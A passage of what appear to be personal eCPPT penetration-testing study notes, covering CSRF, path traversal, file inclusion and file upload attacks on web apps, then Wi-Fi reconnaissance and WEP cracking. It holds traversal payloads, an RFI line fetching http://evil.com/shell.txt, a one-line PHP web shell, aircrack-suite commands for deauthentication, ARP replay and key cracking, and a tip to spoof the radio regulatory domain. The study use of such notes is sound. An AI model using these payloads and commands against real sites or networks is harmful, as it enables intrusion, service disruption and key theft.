instead of a specific vulnerabilty.   CSRF is a vuln where a third-party web app is able to perform an action on the users behalf.   Its based on the fact that web app can send requests to other web apps, without showing the response.   Example:     Bob (victim) visits amazon.com, logs in, then leaves the site without logging out.   Bob then visits foo.com (malicious site) which inadvertently executes a request to amazon.com from the Bobs browser (such as buy a book)   The victim browser sends this request, along with all the victim cookies. The request seems legit to amazon.com      Since Bob is still logged in on Amazon, the request goes through and the money is withdrawn from his account For the purchase of the book.   This is because Bob already has an authenticated session open on Amazon.   Google, Amazon, ebay and other major websites used to be vulnerable to CSRF but a large number of smaller websites and third party application scripts still remain vulnerable.   Finding CSRF     All requests to a web app that do not implement an Anti-CSRF mechanism are automatically vulnerable.   → http://thehackernews.com/2014/08/flickr-cross-site-request-forgery.html   → http://web.archive.org/web/20150418174949/http:/breakingbits.net/2015/01/18/taking-over-godaddy-accounts-using-csrf/   → http://www.ehackingnews.com/2012/10/hacker-news-csrf-vulnerability-in-Twitter.html      Storing session tokens in cookie enables CSRF exploitability, while storing session tokens into URLs enable other kind of exploits. Tokens and Captchas are the most commonly used protection mechanisms.    Exploiting CSRF     First, we have to identify the structure of the request that will let us reach our objective (adding a super admin in our case). There is obviously a CGI that takes some arguments through GET or POST.   The CGI creating a new Super Admin user in Joomla is /administrator/index.php. it takes arguments through the POST method.   Check the parameters with burp   Since the request method is a POSt, we have to use a proxy that will let us transform a GET request into a POST request.   → http://shiflett.org/blog/2007/jul/csrf-redirector   Preventing     The most common protection mechanism against CSRF exploit is the token.   In a real scenario, the Add-user form in the administration are of CMSs include a hidden input that requires a token. This token can be implemented as an MD5 hash (or stronger) of some randomly-generated string.   While rendering the form to the user, the following steps are taken by the web application to enforce protection against CSRF exploits:   Generate a Token Include the token as hidden input on the form Save the token in the session variables    &lt;form action=\"adduser.php\" method=\"POST\"&gt; &lt;input type=\"text\" name=\"username\"/&gt; ... &lt;input type=\"hidden\" name=\"token\" value=\"12345345675687\" ... &lt;/form&gt;       Adduser.php will have to check that the token stored in the session matches the token received through the POST.  If they match, the request is fulfilled, otherwise its refused.       Its crucial that the token must be random, unpredictable and change For at least every session.   The token becomes useless when the application is also vulnerable to XSS.   Anyway, to prevent CSRF, one has to implement a random token For every request and be immune to XSS exploits at the same time.   File and Resources Attacks     Authorization attacks have to do with accessing information that the user does not have permission to access.   Path Traversal     This attack, aka dot-dot-dash attack (../), is usually performed by means of those characters that allow us to move up in the directory tree.   Example:  Linux path =  \t../../../etc/passwd  Win path = \t../../../windows/win.ini  \t../../../boot.ini   Path Convention     Depending on the Operating System running on the web server, a root folder can be located using the following syntax:   *Nix:  slash = /   Windows:  &lt;driver letter&gt;:\\ = C:\\      Directory separator symbols   *Nix:  Slash /   Windows:  Slash / Backslash \\   To move up the current directory:  ../   To terminate the current file name:  %00 = NULL BYTE   // does not work with PHP &gt;=5.3.4 // This can be useful to terminate the string in case something else is appended to it by the web application.   file_read(\"/htdocs/website/reports/\" user_input + \".pdf\");   // the %00 would allow the user to terminate the string and read any other file extensions   ../../etc/passwd%00   Encoding     Web app that perform filtering operations on these nasty characters should be aware of different encodings.                  character       URL encoding       16-bit Unicode                 .       %2e       %u002e                 /       %2f       %u2215                 \\       %5c       %u2216              Any combination of the previous encoding may work on the target web app.   Best Defensive Techniques     The simplest way to defend against a path traversal attack is to filter any malicious sequences from the input parameters; on the right, you can see some typical sequences that should be filtered. In most cases, you will also want to filter the “/” char alone.   \"../ \" \"..\\ \" \"%00 (NULL BYTES)\"   File Inclusion Vulnerabilities     Divided into Remote and Local   LFI     Still found in custom scripts where path characters are not stripped from input and the input is used as part of an include.   RFI     Works the same way as LFI, the only difference is that the file to be included is pulled remotely.   Our aim in this case is not just to read but, to include our own code in the execution. An exploitable URL would look like this:    page=http://evil.com/shell.txt      In this case, shell.txt containing PHP code, will be included in the page and executed.   A common exploit to this vulnerability is to include a PHP shell that would let the hacker or the pentester execute any code on the server.   Even the simplest PHP shell will accept commands from GET/POST arguments and execute them on the server.        Its important to know that the file included must not have the .php extension. Otherwise the code within the included file will run on the attacker machine, instead of the target web app.       To immediately spot a vulnerable parameter, you can try to inject http://google.com   If its vulnerable, the HTML code of google.com should be injected in the vuln page.      note: RFI is possible because the allow_url_include directive is set to On within php.ini. Its good practice to set it to Off. Exploiting RFI requires that you have a PHP shell uploaded somewhere and accessible from the internet.    Unrestricted File Upload  → https://www.owasp.org/index.php/Unrestricted_File_Upload     One of the most dangerous vuln a web app can suffer from.   This vuln affects all the web apps that allow file upload, without properly enforcing restrictive policies on:   The maximum size of the file (DoS)   The nature of the file (Image, PDF, XLS, etc)   example that we can upload  &lt;?php \texec($_GET['command']); ?&gt;   With the simple shell the attacker would be able to launch arbitrary OS commands by specifying them in the URL:  site.php?command=&lt;COMMAND&gt;   Vulnerable Web App     In order For the app to be vuln, the following conditions must apply:   The filetype is not checked against a whitelist of allowed formats   The filename and path of the uploaded file is known to the attacker or is guessable   The folder in which the file is placed allows the execution of server-side scripts   Although a web shell may allow the attacker to execute commands, browse the system and so on, other attacks can be run such as:  Phishing pages defacing of the web application storing XSS uploading malicious files  etc   The attack  The first thing to do is to understand how the application works:  Where the file is stored How its used How its included in the web application itself   Best Defensive Techniques  A web developer should inspect the uploaded file at two different layers:  METADATA (name, extension, size, etc) Actual content      Enforcing a whitelist or blacklist, of allowed file extensions is the first line of defense but, unfortunately not the ultimate solution. This will just make it more difficult For attacker but, it will not stop them.       The file extension is not a protection mechanism, cause we can upload malicious payloads within a text file renamed with .pdf, and it will be executed.       The best defense is to actually determine the file type by inspecting the content of the uploaded file.  This can be achieved using libraries For binary formats or parsers For text files however, this is not the only recommendation.       Web developers must limit the file size as well as the file name, set proper permission on the upload folder, filter and discard special characters, use virus scanners and so on.    Questions to answer if u are a web dev:  Who will use the uploaded file? How will the uploaded file be used? will the content of the file be interpreted by an HTML parser? What privileges will this file have/need on my server?   ","categories": ["notes","ecppt"],
        "tags": ["begginer","pentest","external","web"],
        "url": "/notes/ecppt/webapp/",
        "teaser": "/assets/images/posts/2023-11-19-ecppt/ecppt-teaser6.jpg"
      },{
        "title": "6 - Wi-Fi Pentest",
        "excerpt":"  Pre-Requisites   Study Guide   Software     Kali   http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#determine_the_chipset   Compability information about specific adapters   Hardware     notebook with WNIC (Wireless Network Interface Controller)   A better option is to buy an external USB Wi-Fi dongle   This is especially true if u plan to perform your attacks from a VM.   When looking For a new Wi-Fi adapter, u have to pay attention to:   → Signal Power   → Receiver sensitivity   → Linux Driver support   Some wireless adapters: \tAlfa AWUS036H      In case u wanna attack different protocols, get a dual-band adapter    Antennas     Two types:   → Omnidirectional // wider area, pick up signals in 360 graus // range goes from 2dBi to 9 dBi // rubber ducky   → Directional // range goes to 12dBi // Cantennas // WokFi // Yagi-Uda = reach gains over 20dBi   Note on signal strength                  dBm       mW                 0       1                 10       10                 15       31                 20       100                 27       500                 30       1000           The majority of wireless adapter drivers are based on the mac80211 framework:  lsmod | grep 80211      Network interface - eth, wifi, ath, wlan        Additional information to install your wireless adapter drivers:       http://www.aircrack-ng.org/doku.php?id=install_drivers       http://wireless.kernel.org/en/users/Drivers       Adapter config  Config:  iwconfig iw list   Change channel:  iwconfig wlan0 channel 11 iw dev wlan0 set channel 11      Maximum transmission depends on the country = regdomain    A trick that is often used to increase maximum transmit power of a wireless adapter consists in setting the country code to match Bolivia:  iw reg set BO iw dev wlan0 set txpower fixed 30dbm iwconfig wlan0   Monitor mode  airmon-ng start wlan0 iwconfig mon0 airmon-ng stop mon0 airmon-ng check kill      kill programs that are blocking our wireless interface or changing its parameters    Testing your setup  Start the monitor interface and set the card to the desired channel first  aireplay-ng -9 mon0  // -9 = test mode   Standards and Networks   IEEE 802.11 Standards  Types of Wireless Network  Wireless frames  Security Features   Wi-Fi Standards and Networks   802.11 Standards     IEEE=Institute of Electrical and Electronics Engineers   Its a worldwide association counting over 425,000 members dedicated to advancing technological innovation.        IEEE 802.11 is related to Wi-Fi technologies       The 2.4GHz band is divided into 14 overlapping channels with a 22MHz bandwidth around the central frequency.   The 5.0GHz is less crowded and guarantees a higher number of non-overlapping channels.   Type of Wireless Networks  Two main types: \tInfrastructure Network \tAd-hoc Network   Infrastrucutre Network     A Basic Service Set (BSS) contains an Access Point (AP) and a set of wireless client stations (STAs).   Every BSS has a unique formal identifier called BSSID (the MAc address of the AP)   BSS also called SSID (Service Set Identifier)   Extended Service Set (ESS) - In this config multiple BSS exist with a common SSID (now called ESSID) nut unique BSSID.   The Access Points are linked together using a backbone Distribution System (DS) which is usually a wired Ethernet network, This enables communications between STAs associated in different BSSs and other segments of the network.   Ad-hoc Network     This type of network does not need an existing infrastrucure. All of the STAs directly communicate to each other, as there is not a central base. A set of station connected like this is called IBSS (Independent Basic Service Set)   Wireless Frames     In the context of the 802.11 specifications, datagrams are called frames.   Each frame consists of:  → An header → An optional payload (data) → A Frame Check Sequence (FCS)      The Frame Control field contains control information defining the type of 802.11 MAC frame and how to process the frame itself.   The frame function is defined by the Type and Subtype fields.   Currently the standard describes three types of frames:  → Management Frames → Control Frames → Data Frames      The frames ‘To DS’ and ‘From DS’ indicate whether the frame is going to or exiting from the DS (distributed system)   THe WEP field (aka Privacy Bit) is a boolean flag and indicates whether or not the WEP algorithm has been used to encrypt the packet. We will discuss WEP and other security features of 802.11 in the next session.   Addresses can be a combination of the following:  → BSSID: identifies an AP → Destination Address (DA): final destination to receive the frame → Source Address (SA): original source that created the frame → Receiver Address (RA): receiving STA → Transmitter Address (TA): transmitting STA      Frame Body is an option field (from 0 to 2312 bytes) that contains the payload of the transmission.   The Frame Check Sequence (a simple Cyclic Redundancy Check (CRC) of the entire frame), is used For transmission error detection.   Beacon     Beacon frames are periodically transmitted by an AP. Their purpose is to advertise the availability of a wireless network. They contain information about network parameters and AP capabilities such as supported throughput rates.   beacons also contain the SSID but that value can be stripped from the frame For security reasons. (Hidden SSID)   Probe Requests     Are sent by a wireless client in order to determine the network availability status. It contains the SSID name of the network and is sent over all the wireless channels. A special “null” (0x00) SSID can be used if the client does not want to search For a specific network.   Proble Responses     Are sent by an AP upon the reception of a Probe Request.   They are very similar to beacons but they can also contain additional information (as specified by the communicating client inside the correponsing Proble Request Frame)   Authentication Frames     Are used to perform the authentication process.        Unlike association or probing, all authentication frames share the same subtype.       After the authentication, a station needs to associate to an AP. This is the purpose of the Association Request Frames. These Frames carry information about the STA capabilities (e.g. supported data rate) and the SSID of the network to which it wishes to associate   After receiving the association request, the AP considers associating with the STA, and (if positive) establishes an Association ID (AID) For the newly associated STA reserving necessary memory resources.   Association Response Frame     Contains an acceptance or rejection notice to the requesting STA. If the AP accepts the STA, the frame includes information regarding the association such as Association ID and supported data rates.   The wireless STA can now start to communicate with other peers in the network through the AP.   A station sends a DIsassociation Frame to another station if it wishes to termimate the association but the same frame can be used by either party of the communication.   Disassociation is often used when the station is roaming from a BSS to another in order to keep the authentication status.   The frame also contains a reason code field.   Deauthentication Frames     Used when all of the communication is terminated. Example, a STA that is shut down gracefully can send a deauthentication frame to alert the access point that its powering off. The AP can then free memory allocations and remove corresponding records in its internal structures.   Security Features  We will explore 2 main aspects:  → Traffic encryption → Station authentication   Encryption   Wired Equivalent Privacy (WEP)     Due to number of flaws it has been deprecated in subsequent versions of the standard.   WEP uses the RC4 algorithm For encryption with a 40 (WEP-40) or 104 bits (WEP-104) long key.   RC4 is a stream cipher that uses a pseudo-random generation algorithm (also called PRGA) coupled with an internal state and a key to generate a byte keystream.   This keystream is then XORed to the plaintext to obtain the final encrypted cyphertext   In WEP implementation, the RC4 internal state is reset on every frame.   the PRGA algorithm is deterministic and would procuce the same results over and over if the same key is applied.   To alleviate this problem, the RC4 implementation designed For WEP makes use of a 24 bits Initialization Vector (IV) as a concatenated prefix of the key.   Key index is a number from 0 to 3 that stands as a key identifier. This mechanism was introduced to facilitate key changes in large organizations.   Integrity Check Value (ICV) - This is a 4-byte CRC code of the original unencrypted frame.   The purpose is to detect frame tampering by an attacker.   WEP Flaws     The first flaw comes from the short length of the IVs.   As this is only 24 bits, there is a 50% probability that the same IV will be repeated after only 5000 packets.   In a semi-busy network, the packet rate is large enough to assure repetitions will happen quite often.   // Keystream reuse is a critical vulnerabilty      If the attacker can get two cyphertexts that were encrypted with the same keystream and has knowledge about one of the two plaintexts, he can recover the other messages with a simple operation.   Its also possible to abuse this vuln For the inverse task of recovering the keystream.        An attacker that has obtained an encrypted frame should not be able to modify that frame and re-inject it into the network successfully.       WEP uses CRC-32 to calculate a checksum (the ICV) of the payload before the encryption. The ICV is then sent encrypted along with the message.   This leads to another WEP flaw: its actually possible to make controlled changes to the frame payload and re-inject it without the receiver noticing.   FMS attack     relies on a subset of the possible IVs, named “weark IVs”. While the other IVs are simply discarded during the attack, these weak IVs can ‘leak’ portions of the key; statistical attacks can be performed in order to fully recover the network key.   Implementations of the attack are avaiable in the aireplay-ng tool.   mr Klein 2005 discovered more correlations between the key and the RC4 generated keystream   moreover: http://cage.ugent.be/~klein/RC4/RC4-en.ps   mr Pychkine, Tews, Weinmann, were able to optimize Kleins attack and apply it to the WEP scenario resulting in a powerful new methodology (named PTW)   moreover: http://eprint.iacr.org/2007/120.pdf   The PTW was able to recover a 104-bit WEP key with 50% probability using onl 40k captured packets.   WPA (Wi-Fi Protected Access)     The main addition was the use of a per-packet 128 bit key, generated using the Temporal Key Integrity Protocol (TKIP) - a feature that prevents the types of attacks that compromised WEP.   This means that For each packet, a new key is dynamically generated.   Another feature of WPA is the addition of a message integrity check (MIC)   This is designed to prevent an attacker from capturing, altering and/or resending data packets; this replaces the Cyclic Redundancy check (CRC) used by WEP that could not provide any security guarantee.   WPA2     The new standard deprecates the use of TKIP in favor of CCMP, a new AES-based encryption scheme with strong security properties.   TKIP was still based on the RC4 cypher. Researchers were able to demonstrate attacks on WPA when TKIP encryption was in use by exploiting some of the known flaws existing in RC4.   Since TKIP is not completely secure and has been deprecated, to guarantee the best security of a Wi-Fi network, WPA2 with CCMP/AES encryption must be used.   Authentication          In order to exchange messages, client stations must be associated with an AP. Before this can happen, stations need to authenticate themselves, proving they have the rights to access the wireless network.            802.11 specifications describes three possible connections states For a client that model this process:       Not authenticated  → Authenticated but not associated  → Authenticated and associated  The 802.11 original standard specified two different stations authentication modes:  → Open Authentication  → Shared Key Authentication (SKA)   Open System     If Open authentication is enabled on the AP, the client station simply sends an Authentication Request Frame, specifying the target SSID, and receives an Authentication Response with a successful result.   The information is broadcasted by the AP in beacon frames, so it cannot be considered a secret.   STA &gt; Open System Authentication Request &gt; AP STA &lt; Open System Authentication Response &lt; AP STA &gt; Association Request &gt; AP STA &lt; Association Response &lt; AP   When one of the steps goes wrong:  Transmission errors Stations incompatibilities MAC filtering       The AP will report a failure status code in its Authentication Response.       Useful to note, the messages exchanged during the process are sent unencrypted. WEP encryption is used only For Data Frames sent immediately after a successful authentication.   Shared Key Authentication     SKA is available only when WEP is enabled. Different from the Open mode, when receiving an Authentication Request, the AP responds with a challenge text (128 bytes). The client needs to encrypt the challenge with the shared WEP key and return it to the AP in the next frame. Then the AP compares the decrypted challenge to the known plaintext and successfully authenticates the client if they are equal.   Schema:  STA &gt; Authentication Request &gt; AP STA &lt; Challenge Text &lt; AP STA &gt; Encrypted Challenge &gt; AP STA &lt; Authentication Response &lt; AP      An attacker will be able to authenticate to the AP once he has snooped over at least one authentication message flow.   This clearly makes the Shared Key Authentication completely broken so you should not rely on it For any security requirements.   Discovery   Tools  Hidden SSID   Tools   Traffic Sniffer  For Linux:  Kismet, airodump-ng   For Windows:  InSSIDer Office   For Mac:  KisMAC   InSSIDer  → ‘http://www.metageek.net/products/inssider-for-office/’   Services:   → SSID  → Signal Strength  → Channels  → Encryption Level (WEP/WPA/WPA2)  → AP MAC address  → Wi-Fi protocol   Kismet  → http://www.kismetwireless.net/      Client/Server architecture. The server provides data while the client application uses them to display information gathered from one or more server. This architecture is further extensible with another subject: drones.   These drones are simple wireless devices that only scan the air and feed captured frames to a specified server.   Firstly put your wireless adapter into monitor mode, as usual.   The simplest way to start sniffing with Kismet and your monitoring interface is through this command:  kismet -c &lt;mon_interface&gt;   Colors define the type of encryption:  green = N (None) red = W (WEP) yellow = O (Other, typically WPA or WPA2)   Airodump-ng  → http://www.aircrack-ng.org/   Can:   → Perform automatic channel switching  → Filter captured traffic by BSSID or cypher suite  → Determine the list of clients associated to a network and their MAC addresses    → Provide information on signal leve, network traffic, security settings   Syntax:  airodump-ng &lt;interface&gt; airodump-ng -c 1,6,11 mon0 // will only scan these 3 channels 1, 6 and 11 airodump-ng -w &lt;filename&gt; &lt;interface&gt; // -w = to save the results of your capture session airodump-ng -c &lt;channel&gt; -b &lt;BSSID&gt; mon0 airodump-ng -t wep mon0 // only filter the WEP encrypted networks [wep, opn, wpa, etc]   Hidden SSID     Almost all APs have an option to cloak the SSID value they broadcast in all the beacon frames. When this option is set, the AP will simply replace the original SSID value with a null value.   While this can be a simple measure to stop a newbie from seing the network, it does not deliver strong protection.        In fact, the tools we have showcased in the previous section are able to discover these so-called hidden networks.       Passive de-cloaking attacks work by sniffing frames transmitted over the network. Many Wi-Fi frames transmitted by both the AP and the STAs will contain an SSID field in plain-text as we have already learned.   Some examples:   → Probe requests  → Probe responses  → Association requests  → Re-Association requests   Open Wireshark and start sniffing on your monitor interface:  wlan[0] == 0x80 // to filter only beacon frames      Now try to config your AP to cloak its SSID value. You will probably find an option with a name like Broadcast SSID or similar. IF you disable SSID broadcast, the network name will be stripped from any new beacon frame.   While a passive attack should work most of the time, there is a slight chance that if the network traffic is very low, an active attack may be necessary.   Network De-Cloaking     Active attacks involve sending DEAUTHENTICATE message For an active station to the station AP. This will force the STA to rejoin the network in order to communicate with the original AP. Since the network is hidden to the STA too, it will have to cycle through all the channels sending Probe Request Frames, allowing us to intercept the Probe Reponses Containing the target SSID field.   Set up a scenario about hidden SSID de-cloaking:   → Configure your AP to hide the SSID value  → Associate a victim client to the network  → Configure your monitoring interface and start sniffing through it with Kismet as previously shown   Upon execution, Kismet will list your network showing a placeholder value in the SSID column:  like that &lt;Hidden SSID&gt;   Locking our wireless adapter to the target network channel:  Kismet menu &gt; selecting Configure Channel &gt; Click Lock in the next Windows and write a proper channel into the input field      Now you need to get the list of STAs associated to the target hidden network as you will next try to deauthenticate one; write down your victim client MAC address   Apply deauthentication:  aireplay-ng -0 &lt;num&gt; -c &lt;target mac&gt; -a &lt;BSSID&gt; &lt;intf&gt;   // -0 &lt;num = deauth attack + times or use 0 For infinite loop // BSSID = target BSSID, the AP MAC address // intf = your monitoring interface      In the Kismet window, you should now see the correctly determined network SSID.   In wireshark you can filter out uninteresting frames:  wlan.fc.type_subtype == 0x05  // Probe response frame sent by the deauthenticated client right after the attack      In small office environment a simple deauthentication attack can reveal the SSID in seconds   In bigger environments a passive scanning will suffice as Probe Requests/Reponses will be much more frequent.   Traffic Analysis   Capturing traffic  Monitor mode  Channel hopping  Wireshark filters  Traffic decryption   Capturing Traffic   iwconfig  // to see the config of your adapter      Processes are not provided with the raw packets data. Instead, the wireless stack deliver the packets as normal Ethernet frames.   If your wireless adapter is not associated to any Wi-Fi network, you will not be able to sense any data   Another limitation of this approach is that you will only see packets directed to your station; you will not be able to sniff traffic from other wireless clients.   This kind of behavior can be useful if you want to debug high level protocols.   Monitor Mode     The equivalent of the promiscuous mode is called monitor mode. An interface configured to work in monitor mode will expose 802.11 frames to higher level protocols and will also accept frames directed to other STAs,   Not all operating systems or drivers natively support monitor mode.   Put your interface into monitor mode:  airmon-ng start &lt;interface&gt;  // The command will create a new virtual WiFI interface. The new interface name will probable be mon0 but this may vary depending on the drivers you are using.   iwconfig  // the new interface must appear   Channel Hopping     Even if you can sniff all of the packets being transmitted over the wireless medium, you are still restricted to one channel at a time.   This is due to how wireless adapters internally de-modulate the received electromagnetic waves and can not be changed.   Channel hopping refers to the technique of constantly switching the channel on which the wireless adapter operates.   This technique is mostly useful For recon purposes than to really capture data, because while locked to a specific channel, the wireless adapter still can not receive frames sent on any others.   Tools For channel hopping: airodump-ng  airodump-ng -w &lt;outputfile&gt; &lt;interface&gt;  // this will create a file name outputfile.cap that you could open with Wireshark For frames dissection. // If you have a supported card, you could also hop on more than one wireless band using the –band option and specifying a combination of a, b and g letters.      a = 5GHz, b and g = 2.4GHz    Wireshark Filters  wlan.fc.type_subtype != 0x08 // 0x08 = beacons, so the filter will get all the frames except beacons.  wlan.fc.type == 0x02 // to filter by frame type   Some more filters that may be useful  →  moreover: http://www.wireshark.org/docs/dfref/w/wlan.html   Filters by AP MAC address:  wlan.bssid   Shows Management Frames related to a SSID:  wlan_mgm.ssid   All frames from or to a specific MAC:  wlan.addr   Search frame with specific Destination Address:  wlan.da   Search frame with specific Source Address:  wlan.sa   WEP encrypted frames:  wlan.fc.wep   Traffic Decryption  &gt; Wireshark  &gt; Edit  &gt; Preferences  &gt; IEEE 802.11 (from the left menu under Protocols section)      Enable decryption   Decryption Keys: click in Edit &gt; new &gt;  Example:  wep/&lt;wep_key_in_hex&gt;  wpa-pwd/&lt;passphrase_as_plain_ASCII_string&gt;:&lt;SSID&gt;      WPA uses a per-session key generated by two communicating stations, you must collect the 4-way handshake between those two stations For wireshark to be able to correctly calculate the key and decrypt the conversation data. To ensure you captured the handshake, apply a filter using eapol      Another tool to decrypt packets WEP, WPA, WPA2 is airdecap-ng    WEP decrypt:  airdecap-ng -w &lt;wep_key_in_hex&gt; &lt;.cap&gt;      you do not need to specify the output file.  Airdecap will automatically append the -dec suffix to the input filename and create a new file.  Upon execution, you will be shown a report of decrypted packets.    WPA decrypt:  airdecap-ng -p &lt;wpa_passphrase&gt; -e &lt;SSID&gt; &lt;.cap&gt;      The main difference is that you also need to specify the network SSID.   You should use plain ASCII characters to specify the passphrase.   Now you can open the produced -dec file with Wireshark.   if you wanna keep the headers information, add the -l flag when running the command.   Module Map   WEP  WPA and WPA2  WPS   Wired Equivalent Privacy (WEP)      Given the low security level provided by the WEP encryption scheme, less and less networks are configured to use it.   The main flaws of WEP encryption:  Weak authentication scheme Short initialization vector (IV) and subsequent frequent reuse Vulnerable to replay attacks Weak frame intregrity protection Low resistance to related key attacks enabling efficient statistical attacks   Setup:  Set your AP to use WEP encryotion Set the WEP key size to 40 bit and choose your key (10 hexadecimal characters) Associate a device to the network. It should not be the same device you will use For the attack   Attacker machine:  - Put your wireless interface into monitor mode airmon-ng start &lt;interface&gt;  - Sniff the network traffic airodump-ng -c &lt;channel&gt; -w wep_attack &lt;interface&gt;   Two columns:  **#Data** and **#/s** you want high values For these columns in order to succeed. Data = number of data frames collected **#/s** = data frames capture rate as frames per second   Deauthentication Attack      When deauthenticated from a wireless network, normally a client will just try to re-authenticate shortly later.   There is a management frame For this purpose; this is sent completely unencrypted and requires no authentication from the sender.   aireplay-ng -0 10 -c &lt;client_mac&gt; -a &lt;bssid&gt; &lt;intf&gt;      This will increase the data frames we gather. (#Data column)   Deauthentication attacks force the victim to actually disconnect from the network. If you abuse this technique, chances are that your attack will be notice! So keep this in mind when pentesting a real-world wireless network.   ARP Replay Attack      A very famous technique to generate a lot of useful traffic on a wireless network is the ARP replay attack   Given that the traffic is encrypted, how can the attacker actually identify an ARP request?   luckily, ARP requests have a fixed payload size (36 bytes) so they can be easily identified.  They always have a broadcast destination address (FF:FF:FF:FF:FF:FF) that is transmitted in plain text in the frame header.      Steps:      Associate with the AP     aireplay-ng -1 15 -a &lt;bssid&gt; -e &lt;ssid&gt; &lt;intf&gt;          // This will associate your adapter to the specified network. You have to provide both BSSID and SSID. The -1 stands For fake authentication while the number on the right is the delay between authentication attempts.       // If you receives deauthentication messages from the victim AP constantly. You can try this variation:  aireplay-ng -1 6000 -q 10 -o 1 -a &lt;bssid&gt; -e &lt;ssid&gt; &lt;intf&gt;   // -q 10 = enable keep-alive packets every 10 seconds to maintain the authentication status // -o 1 = forces aireplay to send one set of packets at a time. // do not close the windows, the aireplay must be running while performing the attack      Listen to ARP requests     aireplay-ng -3 -b &lt;bssid&gt; &lt;intf&gt;          // The aireplay is saving ARP requests to a file. // The next time you will not need to wait again For ARP requests.            Capture the ARP request // you can generate one by pinging a nonexistent IP from your victim client.            Almost instantly aireplay will start to re-inject the captured ARP request // Sent packets goes up really quickly       Airodump will show the increase in received data frames as you are flooding the AP // ‘#/s’ will be bumped   Cracking the Key with AirCrack-ng      Aircrack-ng is a software that encapsulates a series of cracking techniques For both WEP and WPA network keys.   The command needs data packets in order to crack the WEP key. The minimum amount of packets depend on the key length. 40 bit keys will require about 5000 IVs to be cracked, while 104 bits key could require a number ten times higher or more.   aircrack-ng -n &lt;key_length&gt; &lt;.cap file&gt;   // As you do not know the key length at the time of the attack, a good strategy is first trying with 64 bits. if that fails For more than 10.000 IVs, try again with a key size of 127 bits.   Other useful options of aircrack-ng:  -a &lt;mode&gt; = use 1 For WEP, 2 For WPA -e &lt;SSID&gt; = target network SSID -b &lt;BSSID&gt; = target APs MAC address -c = search only alpha-numeric characters -t = search only binary coded decimal characters -w &lt;wordlist&gt; = provide path to wordlists For dictionary attack      Try to run aircrack on our captured packets.     aircrack-ng -e &lt;SSID&gt; wepattack1*.cap          // the cracking process wil begin, If the IVs number is not sufficient, aircrack will just wait For airodump to get more so you do not need to restart the command.       // This technique requires only ARP request/responses in order to work as they are used to improve the speed of the cracking process.      So the usual network traffic will not be useful and you will need to launch an active attack with the ARP generation techniques we discussed earlier.      if you have collected enough IVs, aircrack should now report the recovered key as follows    KEY FOUND! [ 00:11:22:33:44:55 ] - key was found and displayed as hexadecimal bytes notation    Korek Attack     PTW is the fastest and default technique used by aircrack but it requires ARP. As a fallback, you can still use the old pre-PTW technique that uses a combination of KoreK statistical methods   you can switch to KoreK attacks by using the -K flag when you launch aircrack-ng.   Clientless WEP cracking     We always assumed the presence of a wireless client associated to the AP. This is a frequent scenario but in the real world, it may sometimes be completely unused.   First, assure yourself there are no clients associated. If this is the case, your airodump output should list zero clients        We now use the aireplay fragmentation attack option to get a PRGA (Pseudo Random Generation Algorithm) stream       Steps:      Authenticate to the AP     aireplay-ng -1 6000 -q 10 -a &lt;BSSID&gt; &lt;interface&gt;           Start aireplay fragmentation attack     aireplay-ng -5  -b &lt;BSSID&gt; -c &lt;source_mac&gt; &lt;interface&gt;          // -5 = indicates the fragmentation attack // source_mac = your wireless adapter MAC          At some point, if you are lucky, you will get a data packet transmitted from the AP.  These are distinguishable by the FromDS bit set to 1.    // the aireplay-ng saves the obtained keystream to a file so now we can forge packets with it.   Troubleshooting     Fragmentation attack can sometimes fail. If you are not able to obtain a keystream, please be sure you are associated to the network and close enough to reach the AP with your wireless signal.   not enouch acks, repeating:   When getting this message from aireplay output, the aircrack documentation suggests to move closer or further away from the AP.      With the capture PRGA we now build an ARP request packet using this command:     packetforge-ng -0 -a &lt;BSSID&gt; -h &lt;source_mac&gt; -k &lt;ip1&gt; -l &lt;ip2&gt; -y &lt;prga.xor&gt; -w &lt;outfile&gt;           // This command creates the packet and saves it to the specified output file // The -0 flag tells packetforge that we want to build an ARP request looking For the MAC address of ip1. Ip2 is the IP address that is starting the request. As usual, we set the BSSID of the target network and use our wireless adapter MAC address as the source. // We used 255.255.255.255 as the value For both -k and -l. Many APs just ignore the IP address used in the ARP so using this value will be fine most of the time.      We will start injecting packets thus generating new IVs so start up airodump to save them.   To inject the forged ARP request:  aireplay-ng -2 -r &lt;packet-file&gt; &lt;interface&gt;  // the packet generated in the previous step // The AP should start replaying the inject packets. // means that the #Data should increase // As we now have a way to generate new traffic, we can proceed through the usual attack process // We will gather IVs and run aircrack as we previously seen.   Bypassing Shared Key Authentication     The attacks we have mounted thus far are targeted to WEP networks using Open Authentication   But there is WEP with SKA (Shared Key Authentication)   Review the steps involved in this attack:  1. Deauthenticate one victim client 2. Obtain keystream from captured authentication frames 3. Authenticate with the AP using recovered keystream 4. Initiate ARP replay attack   Steps to attack     Deauthentication     airodump-ng -c &lt;channel&gt; -w shared &lt;interface&gt;           in another terminal  aireplay-ng -0 0 -e &lt;SSID&gt; -c &lt;client MAC&gt; &lt;interface&gt;      Obtain the keystream            Watch your airodump terminal window; On the top part, you should see a message which informs you a keystream was recovered.           // The recovered keystream will be save in a .xor file located in the airodump working directory.      Authenticate with the AP            We can try to authenticate ourselves with the target AP           We will launch aireplay fake authentication attack but this time, we will provide the command with the needed keystream  aireplay-ng -1 6000 -1 10 -e &lt;SSID&gt; -y &lt;file.xor&gt; &lt;interface&gt;      Initiate ARP replay attack            The attack is now almost complete. You just need to perform ARP replay as we learned in the previous section.           Attacking the Client     This new attack permits WEP cracking off-site. This is possible because these attacks target the wireless clients instead of the network infrastructure. Caffe-Latte Attack   Caffe-Latte Overview     The main target of the attack is the roaming client. As we have learned in our theoretic presentation of Wi-Fi principles, an unassociated client periodically sends out Probe Requests on every channel, searching For the wireless networks its configured to use.   Probe Requests only search For a particular SSID so that the AP MAC address can change without affecting the clients.   Most wireless clients, upon association to a network, will send out a few gratuitous ARP and DHCP requests. These packets are encrypted! A basic form of the attack could now deauthenticate the client and restart the process over and over until a sufficient amount of IVs has been gathered. Unfortunately, this could take a huge amount of time and would be not practical as we are targeting a roaming client and we have only a few minutes.   In fact, its possible to flip bits in the packet payload and then adjust the corresponding ICV (Integrity Check Value), a CRC-32 field calculated on the encrypted data, obtaining a perfectly valid packet.   Once an gratuitous ARP packet is received, its possible to flip certain bytes and forge a new ARP request targeting the client (see the paper For details). Its now possible to flood the client with these ARP requests and collect a huge amount of encrypted packets in a few minutes.   Caffe-Latte Attack   This lab will assume the following:  Your target network AP is switched off or out of reach A client with a pre-configured WEP key For the target network is in range and unassociated to any wireless network You have another device that you will use as your attack point      If we start airodump, we can see our client is sending 